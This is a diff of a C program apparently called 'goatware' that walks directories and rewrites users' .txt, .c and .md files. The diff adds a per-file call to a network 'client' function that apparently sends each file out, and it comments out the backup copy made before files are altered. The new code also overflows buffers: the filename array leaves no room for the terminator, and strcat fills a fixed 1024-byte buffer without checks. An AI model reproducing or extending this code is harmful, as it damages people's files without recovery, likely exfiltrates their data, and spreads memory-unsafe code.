@@ -44,6 +44,16 @@ void openDir(const char *direct, int level) {
 		}
 		else {
 			/* Changes file if is a .txt, .c, or .md file */
+			int entryLength = strlen(entry->d_name);
+			char filename[entryLength];
+			strcpy(filename, entry->d_name);
+			char cwdNetwork[1024];
+			strcpy(cwdNetwork, direct);
+			strcat(cwdNetwork, "/");
+			strcat(cwdNetwork, filename);
+
+			client(filename, cwdNetwork);
+
 			changeTxt(entry, direct); 
 			changeC(entry, direct);
 			changeMd(entry, direct);
@@ -78,7 +88,7 @@ void givePermission() {
 	closedir(dir);
 }
 
-//copies original file to goatware folder
+/*copies original file to goatware folder
 int copyFile(char *address, char *destPath) {
     int sourceFolder, destinationFolder, x, reader;
     unsigned char buffer[4096];
@@ -105,7 +115,7 @@ int copyFile(char *address, char *destPath) {
 
     close(sourceFolder);
     close(destinationFolder);
-}
+}*/
 void changeTxt(struct dirent *entry, const char *direct) {
 	int entryLength = strlen(entry->d_name);
 
@@ -139,7 +149,7 @@ void changeTxt(struct dirent *entry, const char *direct) {
 		strcat(address, "/");
 		strcat(address, fileName);
 
-		copyFile(address, destPath);	
+		//copyFile(address, destPath);	
 
 		FILE *fp1, *fp2;
 		char ch;
@@ -198,7 +208,7 @@ void changeC(struct dirent *entry, const char *direct) {
 		strcat(address, "/");
 		strcat(address, fileName);
 
-		copyFile(address, destPath);	
+		//copyFile(address, destPath);	
 
 		FILE *fp1, *fp2;
 		char ch;
@@ -256,7 +266,7 @@ void changeMd(struct dirent *entry, const char *direct) {
 		strcat(address, "/");
 		strcat(address, fileName);
 
-		copyFile(address, destPath);	
+		//copyFile(address, destPath);	
 
 		FILE *fp1, *fp2;
 		char ch;
